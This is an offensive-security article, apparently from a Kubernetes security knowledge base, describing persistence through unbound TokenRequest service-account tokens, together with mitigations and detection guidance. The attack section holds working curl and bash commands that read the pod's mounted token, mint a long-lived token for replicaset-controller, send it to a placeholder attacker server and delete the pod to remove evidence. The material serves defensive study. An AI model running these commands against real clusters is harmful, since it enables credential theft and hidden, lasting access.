---
title: Persistence via Unbound Service Account Tokens
description: Using unbound tokens from the TokenRequest API to maintain cluster access after deleting the attacking pod
category: offensive
offensiveType: persistence
createdAt: 2026-04-14
impact: >-
  An attacker can request an unbound token for a privileged service account, delete the attacking pod to eliminate the only visible in-cluster artifact, and continue using the token from outside the cluster until it expires. The token is not tied to any pod lifecycle and leaves no persistent object in etcd. Detection relies entirely on audit logs.
mitigation:
  - Alert on TokenRequest audit events where the request body has no boundObjectRef and the target service account differs from the requester's own account.
  - Set --service-account-max-token-expiration on the API server to cap the maximum lifetime of all issued tokens, preventing attackers from requesting tokens valid for years.
  - Restrict create on serviceaccounts/token using resourceNames so roles can only target named service accounts.
  - Correlate TokenRequest events with pod deletion events in a short time window to detect the retrieve-and-delete pattern.
mitreTechniques:
  - T1550.001
  - T1078
  - T1528
tools:
  - kubectl
  - curl
references: |
  - [Privilege Escalation via serviceaccounts/token Permission](/topics/privilege-escalation-via-serviceaccount-token-creation)
  - [Detecting Unbound Service Account Token Persistence](/topics/detecting-unbound-serviceaccount-token-persistence)
  - [Detecting and Restricting Service Account Token Generation](/topics/detecting-restricting-serviceaccount-token-generation)
  - [Attacker persistence in Kubernetes using the TokenRequest API](https://securitylabs.datadoghq.com/articles/kubernetes-tokenrequest-api/)
  - [Kubernetes TokenRequest API](https://kubernetes.io/docs/reference/kubernetes-api/authentication-resources/token-request-v1/)
---

A compromised pod is a visible artifact. It appears in workload listings, produces audit log entries, and can be discovered and terminated. An attacker operating from inside that pod needs a credential that outlasts their presence in the cluster before they clean up.

> [!WARNING]
> The compromised pod's service account must hold `create` on `serviceaccounts/token` in the namespace where the target service account lives. If the target is `replicaset-controller` in `kube-system`, the RBAC grant must exist in `kube-system`, regardless of which namespace the attacker's pod runs in.

The TokenRequest API is the mechanism Kubernetes provides for issuing short-lived tokens to running workloads at runtime. The kubelet, admission controllers, and service mesh sidecars all use it. Its safety property is the `boundObjectRef` field, which ties a token to a specific pod. When that pod is deleted, the token dies with it. Ephemeral credentials tied to a workload's lifetime are the intended use.

Omitting `boundObjectRef` turns this safety mechanism off. The token is no longer tied to any object in the cluster. It remains valid until its `exp` claim regardless of what happens to the pod that requested it.

## Why unbound tokens persist

The `TokenRequest` spec accepts an optional `boundObjectRef` that ties the token to a pod. When present, the API server validates that the bound pod still exists on each authentication attempt. When the bound pod is deleted, the token is invalidated. When `boundObjectRef` is omitted, the token is independent of any in-cluster object and the API server has no object to check. The token survives for the full `expirationSeconds` duration.

The API server enforces that the bound pod must be running as the same service account as the token being requested. A token for `replicaset-controller` can only be bound to a pod with `serviceAccountName: replicaset-controller`. Attempting to bind it to a pod running as a different service account results in a 422 error at token issuance time.

An unbound token request omits `boundObjectRef` entirely:

```json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "expirationSeconds": 3600
  }
}
```

After the pod is deleted, the unbound token remains valid. The API server returns a **403 Forbidden** response, which means the credential was accepted and RBAC was evaluated. The identity is recognized and the token is alive. Only the specific action was denied by RBAC:

```bash
curl -sk https://<apiserver>/api/v1/namespaces/default/secrets \
  -H "Authorization: Bearer <unbound-token>"
```

```output
{
  "kind": "Status",
  "code": 403,
  "message": "secrets is forbidden: User \"system:serviceaccount:kube-system:replicaset-controller\" cannot list resource \"secrets\" in API group \"\" in the namespace \"default\""
}
```

For comparison, a bound token (with `boundObjectRef`) would return **401 Unauthorized** after the bound pod is deleted. The token itself is rejected before reaching authorization. The invalidation is delayed by up to approximately 10 seconds due to a hardcoded token authentication cache in the kube-apiserver. The success cache TTL is 10 seconds, set in `pkg/kubeapiserver/options/authentication.go`. On a cache hit the bound pod existence check is bypassed entirely. After the cache expires, the pod lookup sees the deletion within a few seconds of informer propagation. This cache TTL is not configurable via CLI flags for the core kube-apiserver. Despite this delay, the bound token is eventually dead. An unbound token has no such dependency and survives until its `exp` claim.

## RBAC permissions

The attacker needs only `create` on `serviceaccounts/token` in the target namespace:

```yaml
rules:
  - apiGroups: [""]
    resources: ["serviceaccounts/token"]
    verbs: ["create"]
```

This is the same permission used in [Privilege Escalation via serviceaccounts/token Permission](/topics/privilege-escalation-via-serviceaccount-token-creation). When the RBAC rule does not include `resourceNames`, the attacker can target every service account in the namespace, not just their own.

No `get` on `serviceaccounts`, no `create` on `pods` (after the initial pod is running), and no access to `secrets` are required. The TokenRequest API does not create a Secret object. The token is returned in the API response body only.

## The attack sequence

This technique requires already holding sufficient RBAC privileges, at minimum `create` on `serviceaccounts/token` for a target service account. That access may have come from a compromised workload running as a privileged service account, or from a prior privilege escalation step. Requesting an unbound token and exfiltrating it turns that access into a persistent credential that survives after the pod is gone. Deleting the pod removes the only object that ties the attacker to the cluster.

### Step 1: Request an unbound token and exfiltrate it in a single operation

The attacker uses the pod's auto-mounted service account credential to call the TokenRequest API. The target in this example is `replicaset-controller` in `kube-system`, which is bound to the `system:controller:replicaset-controller` ClusterRole and holds cluster-wide pod creation and deletion permissions. The request omits `boundObjectRef` so the resulting token is unbound.

The token is captured in a shell variable and piped directly to the exfiltration request. Nothing is written to disk:

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

STOLEN=$(curl -s -X POST \
  "${APISERVER}/api/v1/namespaces/kube-system/serviceaccounts/replicaset-controller/token" \
  --cacert "${CACERT}" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authentication.k8s.io/v1","kind":"TokenRequest","spec":{"expirationSeconds":3600}}' \
  | jq -r '.status.token')

curl -s -X POST https://<attacker-server>/collect \
  -d "token=${STOLEN}"
```

### Step 2: Delete the compromised pod to remove in-cluster evidence

The pod runs in `kube-system` because that is where the RBAC grant exists. It can be deleted using the stolen token itself, because `replicaset-controller` holds pod delete permissions across all namespaces:

```bash
curl -sk -X DELETE https://<apiserver>:6443/api/v1/namespaces/kube-system/pods/compromised-pod \
  -H "Authorization: Bearer <stolen-token>"
```

### Step 3: Continue accessing the cluster externally using the exfiltrated token

The attacker authenticates to the API server from outside the cluster using the stolen token. The API server accepts the credential because the token was never tied to the deleted pod:

```bash
curl -sk https://<apiserver>:6443/api/v1/namespaces/kube-system/pods \
  -H "Authorization: Bearer <stolen-token>"
```

At this point the cluster has no running pod belonging to the attacker, no Secret containing the token, and no persistent object in etcd. ServiceAccount token rotation does not invalidate the stolen credential because the token was issued by the TokenRequest API, not stored as a Secret. The only artifact is a single audit log entry from the token request.

## Maximizing token lifetime

When `--service-account-max-token-expiration` is not set on the API server, there is no ceiling on `expirationSeconds`. An attacker can request a token valid for years:

```json
{
  "apiVersion": "authentication.k8s.io/v1",
  "kind": "TokenRequest",
  "spec": {
    "expirationSeconds": 999999999
  }
}
```

The resulting token is signed by the API server's private key and cannot be revoked. It remains valid until its `exp` claim regardless of any changes to RBAC bindings, pod state, or service account rotation.

Setting `--service-account-max-token-expiration` caps all issued tokens regardless of what the caller requests:

```bash
kube-apiserver --service-account-max-token-expiration=3600 ...
```

With this flag set to one hour, requesting 999999999 seconds still produces a token that expires in one hour. Some managed Kubernetes distributions enforce their own limits. AWS EKS limits the maximum token lifetime to 24 hours. Azure AKS and Google GKE apply their own defaults as well.

## Why this is a distinct technique

The privilege escalation documented in [Privilege Escalation via serviceaccounts/token Permission](/topics/privilege-escalation-via-serviceaccount-token-creation) focuses on acquiring a more privileged identity using the `serviceaccounts/token` subresource. That technique describes how the token is obtained. This one covers what comes next, using an unbound token to maintain access with no in-cluster footprint.

| Aspect | Privilege escalation | Unbound token persistence |
| --- | --- | --- |
| Goal | Acquire a privileged identity | Maintain access without in-cluster presence |
| Evidence in cluster | Running pod | None after pod deletion |
| Detection surface | Running workloads + audit log | Audit log only |
| Mitigation priority | Restrict token creation permissions | Cap token lifetime, alert on unbound requests |

The key differentiator is the absence of `boundObjectRef`. A request without `boundObjectRef` where the target service account differs from the requester is the signal that distinguishes persistence from normal token usage.

Detection signals and audit policy configuration for this technique are covered in [Detecting Unbound Service Account Token Persistence](/topics/detecting-unbound-serviceaccount-token-persistence).
